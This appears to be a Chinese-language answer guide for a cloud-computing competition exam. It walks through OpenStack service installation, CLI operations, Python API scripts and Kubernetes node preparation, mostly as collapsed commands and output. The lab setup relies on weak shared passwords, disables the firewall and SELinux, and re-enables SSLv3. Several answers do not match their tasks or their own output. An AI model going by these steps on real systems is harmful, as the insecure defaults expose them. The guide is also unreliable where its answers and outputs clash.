Mysql Barbican user. exmaple:000000BARBICAN_DBPASS=000000#Password for Keystore Barbican user. exmaple:000000BARBICAN_PASS=000000[root@localhost ~]# cat /etc/xiandian/openrc.sh | grep -v ^# | grep -v ^$HOST_IP=192.168.157.20HOST_PASS=000000HOST_NAME=controllerHOST_IP_NODE=192.168.157.21HOST_PASS_NODE=000000HOST_NAME_NODE=computenetwork_segment_IP=192.168.157.0/24RABBIT_USER=openstackRABBIT_PASS=000000DB_PASS=000000DOMAIN_NAME=demoADMIN_PASS=000000DEMO_PASS=000000KEYSTONE_DBPASS=000000GLANCE_DBPASS=000000GLANCE_PASS=000000NOVA_DBPASS=000000NOVA_PASS=000000NEUTRON_DBPASS=000000NEUTRON_PASS=000000METADATA_SECRET=000000INTERFACE_IP=192.168.157.21INTERFACE_NAME=ens34Physical_NAME=providerminvlan=101maxvlan=200CINDER_DBPASS=000000CINDER_PASS=000000BLOCK_DISK=sdb1SWIFT_PASS=000000OBJECT_DISK=sdb2STORAGE_LOCAL_NET_IP=192.168.157.21HEAT_DBPASS=000000HEAT_PASS=000000ZUN_DBPASS=000000ZUN_PASS=000000KURYR_DBPASS=000000KURYR_PASS=000000CEILOMETER_DBPASS=000000CEILOMETER_PASS=000000AODH_DBPASS=000000AODH_PASS=000000BARBICAN_DBPASS=000000BARBICAN_PASS=000000

③分别在 controller 节点和 compute 节点执行 iaas-pre-host.sh 文件(不需要重启云主机)。
[root@controller ~]# iaas-pre-host.sh

④在 controller 节点执行 iaas-install-mysql.sh 脚本，会自行安装 mariadb、memcached、rabbitmq 等服务和完成相关配置。执行完成后修改配置文件将缓存 CACHESIZE 修改为 128,并重启相应服务。
[root@controller ~]# iaas-install-mysql.sh[root@controller ~]# cat /etc/sysconfig/memcachedPORT=&quot;11211&quot;USER=&quot;memcached&quot;MAXCONN=&quot;1024&quot;CACHESIZE=&quot;128&quot;OPTIONS=&quot;-l 127.0.0.1,::1,controller&quot;#重启生效[root@controller ~]# systemctl restart memcached

⑤在 controller 节点执行 iaas-install-keystone.sh 脚本，会自行安装 keystone 服务和完成相关配置。使用 openstack 命令，创建一个名为 tom 的账户，密码为 tompassword123,邮箱为tom@example.com
[root@controller ~]# iaas-install-keystone.sh[root@controller ~]# source /etc/keystone/admin-openrc.sh[root@controller ~]# openstack user create tom --password tompassword123 --email tom@example.com --domain demo+---------------------+----------------------------------+| Field               | Value                            |+---------------------+----------------------------------+| domain_id           | c7a3303c6f7748f2b22f6421149226b5 || email               | tom@example.com                  || enabled             | True                             || id                  | 131e1e035c174fd0a10862fe47844cf1 || name                | tom                              || options             | &#123;&#125;                               || password_expires_at | None                             |+---------------------+----------------------------------+



⑥在 controller 节点执行 iaas-install-glance.sh 脚本，会自行安装 glance 服务和完成相关配 置 。 完 成 后 使 用 openstack 命 令 , 创 建 一 个 名 为 cirros 的 镜 像 ， 镜 像 文 件 使 用cirros-0.3.4-x86_64-disk.img。
###注意请将镜像文件上传[root@controller ~]# iaas-install-glance.sh[root@controller ~]# openstack image create --disk-format qcow2 --container bare --file cirros-0.3.4-x86_64-disk.img  cirros+------------------+------------------------------------------------------+| Field            | Value                                                |+------------------+------------------------------------------------------+| checksum         | ee1eca47dc88f4879d8a229cc70a07c6                     || container_format | bare                                                 || created_at       | 2023-04-17T03:13:42Z                                 || disk_format      | qcow2                                                || file             | /v2/images/c51eee70-1885-4482-9252-d808c2832cdb/file || id               | c51eee70-1885-4482-9252-d808c2832cdb                 || min_disk         | 0                                                    || min_ram          | 0                                                    || name             | cirros                                               || owner            | 3b0c23a093dd4f11bbd8d7316634b784                     || protected        | False                                                || schema           | /v2/schemas/image                                    || size             | 13287936                                             || status           | active                                               || tags             |                                                      || updated_at       | 2023-04-17T03:13:42Z                                 || virtual_size     | None                                                 || visibility       | shared                                               |+------------------+------------------------------------------------------+



⑦在 controller 节点执行 iaas-install-nova-controller.sh，compute 节点执行iaas-install-nova-compute.sh，会自行安装 nova 服务和完成相关配置。使用 nova 命令创建一个名为 t,ID 为 5，内存为 2048MB,磁盘容量为 10GB,vCPU 数量为 2 的云主机类型。
[root@controller ~]#  iaas-install-nova-controller.sh[root@compute ~]# iaas-install-nova-compute.sh##注意在compute节点跑完之后运行[root@controller ~]# nova flavor-create t 5 2048 10 2+----+------+-----------+------+-----------+------+-------+-------------+-----------+-------------+| ID | Name | Memory_MB | Disk | Ephemeral | Swap | VCPUs | RXTX_Factor | Is_Public | Description |+----+------+-----------+------+-----------+------+-------+-------------+-----------+-------------+| 5  | t    | 2048      | 10   | 0         |      | 2     | 1.0         | True      | -           |+----+------+-----------+------+-----------+------+-------+-------------+-----------+-------------+



⑧在 controller 节点执行 iaas-install-neutron-controller.sh,compute节点执行iaas-install-neutron-compute.sh，会自行安装 neutron 服务并完成配置。创建云主机外部网络 ext-net，子网为 ext-subnet，云主机浮动 IP 可用网段为192.168.10.100 ~ 192. 168.10.200，网关为 192.168.100.1。
[root@controller ~]# iaas-install-neutron-controller.sh[root@compute ~]# iaas-install-neutron-compute.sh# 创建网络[root@controller ~]# source admin-openrc[root@controller ~]# openstack network create --external ext-net# 创建子网[root@controller ~]# openstack subnet create  --gateway 192.168.100.1 --allocation-pool start=192.168.10.100,end=192.168.10.200 --network ext-net --subnet-range 192.168.10.0/24 ext-subnet[root@controller ~]# openstack subnet show ext-subnet+-------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+| Field             | Value                                                                                                                                                   |+-------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+| allocation_pools  | 192.168.200.100-192.168.200.200                                                                                                                         || cidr              | 192.168.200.0/24                                                                                                                                        || created_at        | 2023-02-22T16:29:20Z                                                                                                                                    || description       |                                                                                                                                                         || dns_nameservers   |                                                                                                                                                         || enable_dhcp       | True                                                                                                                                                    || gateway_ip        | 192.168.200.1                                                                                                                                           || host_routes       |                                                                                                                                                         || id                | 6ab2ab75-3a82-44d5-9bc8-c2c0a65872d6                                                                                                                    || ip_version        | 4                                                                                                                                                       || ipv6_address_mode | None                                                                                                                                                    || ipv6_ra_mode      | None                                                                                                                                                    || location          | cloud=&#x27;&#x27;, project.domain_id=, project.domain_name=&#x27;Default&#x27;, project.id=&#x27;ce21284fd468495995218ea6e1aeea2a&#x27;, project.name=&#x27;admin&#x27;, region_name=&#x27;&#x27;, zone= || name              | ext-subnet                                                                                                                                              || network_id        | bc39443b-9ef8-4a4d-91b3-fd2637ada43f                                                                                                                    || prefix_length     | None                                                                                                                                                    || project_id        | ce21284fd468495995218ea6e1aeea2a                                                                                                                        || revision_number   | 0                                                                                                                                                       || segment_id        | None                                                                                                                                                    || service_types     |                                                                                                                                                         || subnetpool_id     | None                                                                                                                                                    || tags              |                                                                                                                                                         || updated_at        | 2023-02-22T16:29:20Z 



⑨在 controller 节点执行 iaas-install-dashboard.sh 脚本，会自行安装 dashboard 服务并完成配置。请修改 nova 配置文件，使之能通过公网 IP 访问 dashboard 首页。
[root@controller ~]# openstack-controller-dashboard.sh[root@controller ~]# vim /etc/nova/nova.conf修改内容如下novncproxy_base_url = http://公网IP:6080/vnc_auto.html[root@controller ~]# cat /etc/nova/nova.conf | grep 公网IPnovncproxy_base_url = http://公网IP:6080/vnc_auto.html

任务 3 OpenStack 运维任务①使用命令创建名称为 group_web 的安全组该安全组的描述为” Custom security group”，用 openstack 命令为安全组添加 icmp 规则和 ssh 规则允许任意 ip 地址访问 web,完成后查看该安全组的详细信息.
# 创建描述为Custom security group的安全组[root@controller ~]# openstack security group create --description &quot;Custom security group&quot; group_web# 添加访问80[root@controller ~]# openstack security group rule create --ingress --ethertype IPv4 --protocol tcp --dst-port 80:80 group_web# 添加访问ssh(22)[root@controller ~]# openstack security group rule create --ingress --ethertype IPv4 --protocol tcp --dst-port 22:22 group_web# 添加访问icmp[root@controller ~]# openstack security group rule create --ingress --protocol icmp group_web



②在 keystone 中创建 shop 项目添加描述为”Hello shop”，完成后使用 openstack 命令禁用该项目，然后使用 openstack 命令查看该项目的详细信息。
[root@controller ~]# openstack project create shop --description &quot;Heelo shop&quot; --domain demo+-------------+----------------------------------+| Field       | Value                            |+-------------+----------------------------------+| description | Heelo shop                       || domain_id   | c7a3303c6f7748f2b22f6421149226b5 || enabled     | True                             || id          | d610f67035114665b15c367ab4e4d879 || is_domain   | False                            || name        | shop                             || parent_id   | c7a3303c6f7748f2b22f6421149226b5 || tags        | []                               |+-------------+----------------------------------+[root@controller ~]# openstack project set shop --disable



③使用 nova 命令查看 admin 租户的当前配额值，将 admin 租户的实例配额提升到 13。登 录 controller 节 点 ，使用 glance 相 关 命 令 上 传 镜 像 ， 源 使 用CentOS_7.5_x86_64_XD.qcow2，名字为 centos7.5，修改这个镜像为共享状态，并设置最小磁盘为 5G。
[root@controller ~]# openstack quota set admin --instances 13[root@controller ~]# openstack quota show admin+----------------------+----------------------------------+| Field                | Value                            |+----------------------+----------------------------------+| cores                | 20                               || fixed-ips            | -1                               || floating-ips         | 50                               || health_monitors      | None                             || injected-file-size   | 10240                            || injected-files       | 5                                || injected-path-size   | 255                              || instances            | 13                               || key-pairs            | 100                              || l7_policies          | None                             || listeners            | None                             || load_balancers       | None                             || location             | None                             || name                 | None                             || networks             | 100                              || pools                | None                             || ports                | 500                              || project              | 3b0c23a093dd4f11bbd8d7316634b784 || project_name         | admin                            || properties           | 128                              || ram                  | 51200                            || rbac_policies        | 10                               || routers              | 10                               || secgroup-rules       | 100                              || secgroups            | 10                               || server-group-members | 10                               || server-groups        | 10                               || subnet_pools         | -1                               || subnets              | 100                              |+----------------------+----------------------------------+[root@controller ~]# glance image-create --disk-format qcow2 --container bare --file CentOS-7-x86_64-DVD-1804.iso --min-disk 5 --name centos7.5+------------------+--------------------------------------+| Property         | Value                                |+------------------+--------------------------------------+| checksum         | 660aab9894136872770ecb6e1e370c08     || container_format | bare                                 || created_at       | 2023-04-17T03:54:50Z                 || disk_format      | qcow2                                || id               | 84cd8c51-ee79-4591-8a9e-b3d689d34c04 || min_disk         | 5                                    || min_ram          | 0                                    || name             | centos7.5                            || owner            | 3b0c23a093dd4f11bbd8d7316634b784     || protected        | False                                || size             | 4470079488                           || status           | active                               || tags             | []                                   || updated_at       | 2023-04-17T03:55:15Z                 || virtual_size     | None                                 || visibility       | shared                               |+------------------+--------------------------------------+[root@controller ~]# openstack image set centos7.5 --share



④请修改 glance 后端配置文件，将项目的映像存储限制为 10GB,完成后重启 glance 服务。
[root@controller ~]# vim /etc/glance/glance-api.confuser_storage_quota = 10737418240# 重启[root@controller ~]# systemctl restart openstack-glance-*# 查询[root@controller ~]# cat /etc/glance/glance-api.conf |grep _quota# ``image_property_quota`` configuration option.#     * image_property_quota#image_member_quota = 128#image_property_quota = 128#image_tag_quota = 128#image_location_quota = 10user_storage_quota = 10737418240



⑤在 controller 节点执行 iaas-install-cinder-controller.sh, compute 节点执行iaas-install-cinder-compute.sh，在 controller 和 compute 节点上会自行安装 cinder 服务并完成配置。创建一个名为 lvm 的卷类型，创建该类型规格键值对，要求 lvm 卷类型对应 cinder后端驱动 lvm 所管理的存储资源,名字 lvm_test，大小 1G 的云硬盘并查询该云硬盘的详细信息。
[root@controller ~]# openstack-controller-cinder.sh [root@compute ~]# openstack-compute-cinder.sh# 创建卷类型lvm[root@controller ~]# source admin-openrc[root@controller ~]# openstack volume type create lvm+-------------+--------------------------------------+| Field       | Value                                |+-------------+--------------------------------------+| description | None                                 || id          | 5a1ac113-b226-4646-9a7c-46eee3f6346f || is_public   | True                                 || name        | lvm                                  |+-------------+--------------------------------------+[root@controller ~]# cinder type-key lvm set volume_backend_name=LVM# 创建云硬盘[root@controller ~]# cinder create --volume-type lvm --name lvm_test 1略                                               # 查看详细信息[root@controller ~]# cinder show lvm_test+--------------------------------+--------------------------------------+| Property                       | Value                                |+--------------------------------+--------------------------------------+| attached_servers               | []                                   || attachment_ids                 | []                                   || availability_zone              | nova                                 || bootable                       | false                                || consistencygroup_id            | None                                 || created_at                     | 2022-10-25T12:28:55.000000           || description                    | None                                 || encrypted                      | False                                || id                             | 39f131c3-6ee2-432a-8096-e13173307339 || metadata                       |                                      || migration_status               | None                                 || multiattach                    | False                                || name                           | lvm_test                             || os-vol-host-attr:host          | compute@lvm#LVM                      || os-vol-mig-status-attr:migstat | None                                 || os-vol-mig-status-attr:name_id | None                                 || os-vol-tenant-attr:tenant_id   | 4885b78813a5466d9d6d483026f2067c     || replication_status             | None                                 || size                           | 1                                    || snapshot_id                    | None                                 || source_volid                   | None                                 || status                         | available                            || updated_at                     | 2022-10-25T12:28:56.000000           || user_id                        | b4a6c1eb18c247edba11b57be18ec752     || volume_type                    | lvm                                  |



⑥请使用数据库命令将所有数据库进行备份,备份文件名为 openstack.sql，完成后使用命令查看文件属性其中文件大小以 mb 显示。
[root@controller ~]# mysqldump -uroot -p000000 --all-databases &gt; /root/openstack.sql[root@controller ~]# du -h /root/openstack.sql1.6M    /root/openstack.sql



⑦进入数据库，创建本地用户 examuser，密码为 000000，然后查询 mysql 数据库中的user 表的 user,host,password 字段。然后赋予这个用户所有数据库的“查询”“删除”“更新”“创建”的权限。
[root@controller ~]# mysql -uroot -pMariaDB [(none)]&gt; create user examuser@&#x27;localhost&#x27; identified by &#x27;000000&#x27;;Query OK, 0 rows affected (0.005 sec)MariaDB [(none)]&gt; use mysqlDatabase changedMariaDB [mysql]&gt; select user,host,password from user;+-----------+------------+-------------------------------------------+| user      | host       | password                                  |+-----------+------------+-------------------------------------------+| root      | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || root      | controller | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || root      | 127.0.0.1  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || root      | ::1        | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || keystone  | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || keystone  | %          | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || glance    | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || glance    | %          | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || nova      | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || nova      | %          | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || placement | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || placement | %          | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || neutron   | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || neutron   | %          | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || cinder    | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || cinder    | %          | *032197AE5731D4664921A6CCAC7CFCE6A0698693 || examuser  | localhost  | *032197AE5731D4664921A6CCAC7CFCE6A0698693 |+-----------+------------+-------------------------------------------+17 rows in set (0.000 sec)MariaDB [mysql]&gt; grant select,delete,update,create on *.* to examuser@&#x27;localhost&#x27;; Query OK, 0 rows affected (0.000 sec)MariaDB [mysql]&gt; select User, Select_priv,Update_priv,Delete_priv,Create_priv from user;+-----------+-------------+-------------+-------------+-------------+| User      | Select_priv | Update_priv | Delete_priv | Create_priv |+-----------+-------------+-------------+-------------+-------------+| root      | Y           | Y           | Y           | Y           || root      | Y           | Y           | Y           | Y           || root      | Y           | Y           | Y           | Y           || root      | Y           | Y           | Y           | Y           || keystone  | N           | N           | N           | N           || keystone  | N           | N           | N           | N           || glance    | N           | N           | N           | N           || glance    | N           | N           | N           | N           || nova      | N           | N           | N           | N           || nova      | N           | N           | N           | N           || placement | N           | N           | N           | N           || placement | N           | N           | N           | N           || neutron   | N           | N           | N           | N           || neutron   | N           | N           | N           | N           || examuser  | Y           | Y           | Y           | Y           |+-----------+-------------+-------------+-------------+-------------+15 rows in set (0.000 sec)



⑧请使用 openstack 命令创建一个名为 test 的 cinder 卷，卷大小为 5G。完成后使用 cinder命令列出卷列表并查看 test 卷的详细信息。
[root@controller ~]# openstack volume create --size 5 test[root@controller ~]# openstack volume show test+--------------------------------+--------------------------------------+| Field                          | Value                                |+--------------------------------+--------------------------------------+| attachments                    | []                                   || availability_zone              | nova                                 || bootable                       | false                                || consistencygroup_id            | None                                 || created_at                     | 2023-04-17T04:05:21.000000           || description                    | None                                 || encrypted                      | False                                || id                             | 67df96a9-cc9f-4a59-8602-e0e50bdf4f26 || migration_status               | None                                 || multiattach                    | False                                || name                           | test                                 || os-vol-host-attr:host          | compute@lvm#LVM                      || os-vol-mig-status-attr:migstat | None                                 || os-vol-mig-status-attr:name_id | None                                 || os-vol-tenant-attr:tenant_id   | 3b0c23a093dd4f11bbd8d7316634b784     || properties                     |                                      || replication_status             | None                                 || size                           | 5                                    || snapshot_id                    | None                                 || source_volid                   | None                                 || status                         | available                            || type                           | None                                 || updated_at                     | 2023-04-17T04:05:22.000000           || user_id                        | 0a6447639e3b44acb584c6b87f194c9e     |+--------------------------------+--------------------------------------+



⑨为了减缓来自实例的数据访问速度的变慢，OpenStack Block Storage 支持对卷数据复制带宽的速率限制。请修改 cinder 后端配置文件将卷复制带宽限制为最高 100 MiB&#x2F;s。
[root@controller ~]# vim /etc/cinder/cinder.conf[lvmdriver-1]volume_group=cinder-volumes-1volume_driver=cinder.volume.drivers.lvm.LVMVolumeDrivervolume_backend_name=LVMvolume_copy_bps_limit=104857600[root@controller ~]# systemctl restart openstack-cinder-*[root@controller ~]# cat /etc/cinder/cinder.conf | grep 104857600volume_copy_bps_limit=104857600



⑩在controller节点执行 iaas-install-swift-controller.sh, compute节点执行iaas-install-swift-compute.sh,在controller和compute节点上会自行安装 swift 服务并完成配置。创建一个名为 file 的容器。
在提供的OpenStack平台上，使用Swift对象存储服务，修改相应的配置文件，使对象存储Swift作为glance镜像服务的后端存储。
[root@controller ~]# openstack-controller-swift.sh[root@compute ~]# openstack-compute-swift.sh[root@controller ~]# swift post file###修改配置文件[root@controller ~]# vi /etc/glance/glance-api.conf[glance_store]stores=glance.store.filesystem.Store,glance.store.swift.Store,glance.store.http.Storedefault_store=swiftswift_store_region=RegionOneswift_store_endpoint_type=internalURLswift_store_container=glanceswift_store_large_object_size=5120swift_store_large_object_chunk_size=200swift_store_create_container_on_put=Trueswift_store_multi_tenant=Trueswift_store_admin_tenants=serviceswift_store_auth_address=http://controller:5000/v3swift_store_user=glanceswift_store_key=000000##重启 glance 所有组件 systemctl restart openstack-glance-*



11用 swift 命令，把 cirros-0.3.4-x86_64-disk.img 上传到 file 容器中。
[root@controller ~]# swift upload file /root/cirros-0.3.4-x86_64-disk.imgroot/cirros-0.3.4-x86_64-disk.img[root@controller ~]# swift stat file               Account: AUTH_d23ad8b534f44b02ad30c9f7847267df             Container: file               Objects: 1                 Bytes: 13287936              Read ACL:             Write ACL:               Sync To:              Sync Key:         Accept-Ranges: bytes      X-Storage-Policy: Policy-0         Last-Modified: Fri, 10 Mar 2023 02:43:07 GMT           X-Timestamp: 1678416180.44884            X-Trans-Id: txfdc2fb777c4641d3a9292-00640a9941          Content-Type: application/json; charset=utf-8X-Openstack-Request-Id: txfdc2fb777c4641d3a9292-00640a9941



12使用提供的云安全框架组件，将提供的OpenStack云平台的安全策略从http优化至https。
controller节点
##安装工具包yum install -y mod_wsgi httpd mod_ssl###修改/etc/openstack-dashboard/local_settings文件vi /etc/openstack-dashboard/local_settings   ##在DEBUG = False下增加4行USE_SSL = TrueCSRF_COOKIE_SECURE = True		##原文中有，去掉注释即可SESSION_COOKIE_SECURE = True		##原文中有，去掉注释即可SESSION_COOKIE_HTTPONLY = True##修改/etc/httpd/conf.d/ssl.conf配置文件vi /etc/httpd/conf.d/ssl.conf  ##将SSLProtocol all -SSLv2 -SSLv3改成：SSLProtocol all -SSLv2##重启服务systemctl restart httpdsystemctl restart memcached



13在提供的OpenStack平台上，通过修改相关参数对openstack平台进行调优操作，相应的调优操作有：
  设置内存超售比例为1.5倍；
 设置nova服务心跳检查时间为120秒。
vi /etc/nova/nova.confram_allocation_ratio = 1.5service_down_time = 120



任务四 OpenStack架构任务①在controller节点安装python3环境。安装完之后查看python3版本，使用提供的whl文件安装依赖。
[root@controller python-depend]# yum install python3 –y[root@controller python-depend]# pip3 install certifi-2019.11.28-py2.py3-none-any.whl[root@controller python-depend]# pip3 install urllib3-1.25.11-py3-none-any.whl[root@controller python-depend]# pip3 install idna-2.8-py2.py3-none-any.whl[root@controller python-depend]# pip3 install chardet-3.0.4-py2.py3-none-any.whl[root@controller python-depend]# pip3 install requests-2.24.0-py2.py3-none-any.whl[root@controller ~]# python3 --versionPython 3.6.8[root@controller ~]# pip3 listDEPRECATION: The default format will switch to columns in the future. You can use --format=(legacy|columns) (or define a format=(legacy|columns) in your pip.conf under the [list] section) to disable this warning.certifi (2019.11.28)chardet (3.0.4)idna (2.8)pip (9.0.3)requests (2.24.0)setuptools (39.2.0)urllib3 (1.25.11)



②编写python代码对接OpenStack API，完成镜像的上传。在controller节点的&#x2F;root目录下创建create_image.py文件，在该文件中编写python代码对接openstack api（需在py文件中获取token），要求在openstack私有云平台中上传镜像cirros-0.3.4-x86_64-disk.img，名字为cirros001，disk_format为qcow2，container_format为bare。执行完代码要求输出“创建镜像成功，id为：xxxxxx”。
[root@controller python3]# python3 create_image.py请输入访问openstack平台控制节点IP地址：（xx.xx.xx.xx)192.168.100.x创建镜像成功，id为：0591f693-a7c7-4e7f-ac6c-957b7bccffc9镜像文件上传成功[root@controller ~]# cat create_image.pyimport requests,json,time# *******************全局变量IP*****************************#执行代码前，请修改controller_ip的IP地址，与指定router，IP可以input，也可以写成静态controller_ip = input(&quot;请输入访问openstack平台控制节点IP地址：（xx.xx.xx.xx)\n&quot;)image_name = &quot;cirros001&quot;file_path = &quot;/root/cirros-0.3.4-x86_64-disk.img&quot;try:    url  = f&quot;http://&#123;controller_ip&#125;:5000/v3/auth/tokens&quot;    body = &#123;       &quot;auth&quot;: &#123;           &quot;identity&quot;: &#123;              &quot;methods&quot;:[&quot;password&quot;],              &quot;password&quot;: &#123;                  &quot;user&quot;: &#123;                     &quot;domain&quot;:&#123;                         &quot;name&quot;: &quot;Default&quot;                     &#125;,                     &quot;name&quot;: &quot;admin&quot;,                     &quot;password&quot;: &quot;000000&quot;                  &#125;              &#125;           &#125;,           &quot;scope&quot;: &#123;              &quot;project&quot;: &#123;                  &quot;domain&quot;: &#123;                     &quot;name&quot;: &quot;Default&quot;                  &#125;,                  &quot;name&quot;: &quot;admin&quot;              &#125;           &#125;       &#125;    &#125;    headers = &#123;&quot;Content-Type&quot;: &quot;application/json&quot;&#125;    Token = requests.post(url, data=json.dumps(body), headers=headers).headers[&#x27;X-Subject-Token&#x27;]    headers = &#123;&quot;X-Auth-Token&quot;: Token&#125;except Exception as e:    print(f&quot;获取Token值失败，请检查访问云主机控制节点IP是否正确？输出错误信息如下：&#123;str(e)&#125;&quot;)    exit(0)class glance_api:    def __init__(self, headers: dict, resUrl: str):       self.headers = headers       self.resUrl = resUrl    #创建glance镜像    def create_glance(self, container_format=&quot;bare&quot;, disk_format=&quot;qcow2&quot;):       body = &#123;           &quot;container_format&quot;: container_format,           &quot;disk_format&quot;: disk_format,           &quot;name&quot;: image_name,        &#125;       status_code = requests.post(self.resUrl, data=json.dumps(body), headers=self.headers).status_code       if(status_code == 201):           return f&quot;创建镜像成功，id为：&#123;glance_api.get_glance_id()&#125;&quot;       else:           return &quot;创建镜像失败&quot;    #获取glance镜像id    def get_glance_id(self):       result = json.loads(requests.get(self.resUrl,headers=self.headers).text)       for item in result[&#x27;images&#x27;]:           if(item[&#x27;name&#x27;] == image_name):              return item[&#x27;id&#x27;]    #上传glance镜像    def update_glance(self):       self.resUrl=self.resUrl+&quot;/&quot;+self.get_glance_id()+&quot;/file&quot;       self.headers[&#x27;Content-Type&#x27;] = &quot;application/octet-stream&quot;       status_code = requests.put(self.resUrl,data=open(file_path,&#x27;rb&#x27;).read(),headers=self.headers).status_code       if(status_code == 204):           return &quot;镜像文件上传成功&quot;       else:           return &quot;镜像文件上传失败&quot;glance_api = glance_api(headers,f&quot;http://&#123;controller_ip&#125;:9292/v2/images&quot;)print(glance_api.create_glance())  #调用glance-api中创建镜像方法print(glance_api.update_glance())



③编写python代码对接OpenStack API，完成用户的创建。在controller节点的&#x2F;root目录下创建create_user.py文件，在该文件中编写python代码对接openstack api（需在py文件中获取token），要求在openstack私有云平台中创建用户guojibeisheng。
[root@controller python3]# python3 create_user.py请输入访问openstack平台控制节点IP地址：（xx.xx.xx.xx)192.168.100.x用户 guojibeisheng 创建成功,ID为dcb0fc7bacf54038b624463921123aed该平台的用户为：guojibeishengadminmyusertomglancenovaplacementneutronheatheat_domain_admincinderswift用户 guojibeisheng 已删除！[root@controller python3]# cat create_user.pyimport requests,json,time# *******************全局变量IP*****************************#执行代码前，请修改controller_ip的IP地址，与指定router，IP可以input，也可以写成静态controller_ip = input(&quot;请输入访问openstack平台控制节点IP地址：（xx.xx.xx.xx)\n&quot;)try:    url  = f&quot;http://&#123;controller_ip&#125;:5000/v3/auth/tokens&quot;    body = &#123;       &quot;auth&quot;: &#123;           &quot;identity&quot;: &#123;              &quot;methods&quot;:[&quot;password&quot;],              &quot;password&quot;: &#123;                  &quot;user&quot;: &#123;                     &quot;domain&quot;:&#123;                         &quot;name&quot;: &quot;Default&quot;                     &#125;,                      &quot;name&quot;: &quot;admin&quot;,                     &quot;password&quot;: &quot;000000&quot;                  &#125;              &#125;           &#125;,           &quot;scope&quot;: &#123;              &quot;project&quot;: &#123;                  &quot;domain&quot;: &#123;                     &quot;name&quot;: &quot;Default&quot;                  &#125;,                  &quot;name&quot;: &quot;admin&quot;              &#125;           &#125;       &#125;    &#125;    headers = &#123;&quot;Content-Type&quot;: &quot;application/json&quot;&#125;    Token = requests.post(url, data=json.dumps(body), headers=headers).headers[&#x27;X-Subject-Token&#x27;]    headers = &#123;&quot;X-Auth-Token&quot;: Token&#125;except Exception as e:    print(f&quot;获取Token值失败，请检查访问云主机控制节点IP是否正确？输出错误信息如下：&#123;str(e)&#125;&quot;)    exit(0)class openstack_user_api:    def __init__(self, handers: dict, resUrl: str):        self.headers = handers        self.resUrl = resUrl    def create_users(self, user_name):        body = &#123;            &quot;user&quot;: &#123;                &quot;description&quot;: &quot;API create user!&quot;,                &quot;domain_id&quot;: &quot;default&quot;,                &quot;name&quot;: user_name            &#125;        &#125;        status_code = requests.post(self.resUrl, data=json.dumps(body), headers=self.headers).text        result = json.loads(requests.get(self.resUrl, headers=self.headers).text)        user_name = user_name        for i in result[&#x27;users&#x27;]:            if i[&#x27;name&#x27;] == user_name:                return f&quot;用户 &#123;user_name&#125; 创建成功,ID为&#123;i[&#x27;id&#x27;]&#125;&quot;    def list_users(self):        result = json.loads(requests.get(self.resUrl, headers=self.headers).text)        roles = []        for i in result[&#x27;users&#x27;]:            if i[&#x27;name&#x27;] not in roles:                roles.append(i[&#x27;name&#x27;])        return &quot;该平台的用户为：\n&quot;+&#x27;\n&#x27;.join(roles)    def get_user_id(self, user_name):        result = json.loads(requests.get(self.resUrl, headers=self.headers).text)        user_name = user_name        for i in result[&#x27;users&#x27;]:            if i[&#x27;name&#x27;] == user_name:                return (f&quot;用户 &#123;user_name&#125; 的ID为&#123;i[&#x27;id&#x27;]&#125;&quot;)    def delete_user(self, user_name):        result = json.loads(requests.get(self.resUrl, headers=self.headers).text)        for i in result[&#x27;users&#x27;]:            if i[&#x27;name&#x27;] == user_name:                i = i[&#x27;id&#x27;]                status_code = requests.delete(f&#x27;http://&#123;controller_ip&#125;:5000/v3/users/&#123;i&#125;&#x27;, headers=self.headers)                return f&quot;用户 &#123;user_name&#125; 已删除！&quot;openstack_user_api = openstack_user_api(headers, f&quot;http://&#123;controller_ip&#125;:5000/v3/users&quot;)print(openstack_user_api.create_users(&quot;guojibeisheng&quot;))print(openstack_user_api.list_users())print(openstack_user_api.delete_user(&quot;guojibeisheng&quot;))

B模块：容器的编排与运维（样题）说明：本任务提供有4台服务器master、node1、node2和harbor，都安装了centos7.5操作系统，在&#x2F;opt&#x2F;centos目录下有CentOS-7-x86_64-DVD-1804系统光盘文件所有文件，在&#x2F;opt&#x2F;containerk8s目录下有本次容器云运维所需的所有文件。
任务 1 容器云平台环境初始化①master 节点主机名设置为 master、node1 节点主机名设置为 node1、node2 节点主机名设置为 node2、harbor 节点主机名设置为 harbor,所有节点关闭 swap，并配置 hosts 映射。
##设置主机名[root@localhost ~]# hostnamectl set-hostname master[root@localhost ~]# hostnamectl set-hostname node1[root@localhost ~]# hostnamectl set-hostname node2[root@localhost ~]# hostnamectl set-hostname harbor##主机映射[root@master ~]# cat /etc/hosts127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4::1         localhost localhost.localdomain localhost6 localhost6.localdomain6192.168.157.50 master192.168.157.51 node1192.168.157.52 node2192.168.157.53 harbor##关闭swap[root@localhost ~]# swapoff -a[root@localhost ~]# vi + /etc/fstab ## /etc/fstab# Created by anaconda on Mon Apr 17 08:27:55 2023## Accessible filesystems, by reference, are maintained under &#x27;/dev/disk&#x27;# See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info#/dev/mapper/centos-root /                       xfs     defaults        0 0UUID=e1892f7d-c16f-47b3-888b-77d0af3521f6 /boot                   xfs     defaults        0 0#/dev/mapper/centos-swap swap                    swap    defaults        0 0#关闭防火墙[root@localhost ~]# systemctl stop firewalld &amp;&amp; systemctl disable firewalldRemoved symlink /etc/systemd/system/multi-user.target.wants/firewalld.service.Removed symlink /etc/systemd/system/dbus-org.fedoraproject.FirewallD1.service.#关闭安全策略[root@localhost ~]# setenforce 0[root@localhost ~]# vi /etc/selinux/config# This file controls the state of SELinux on the system.# SELINUX= can take one of these three values:#     enforcing - SELinux security policy is enforced.#     permissive - SELinux prints warnings instead of 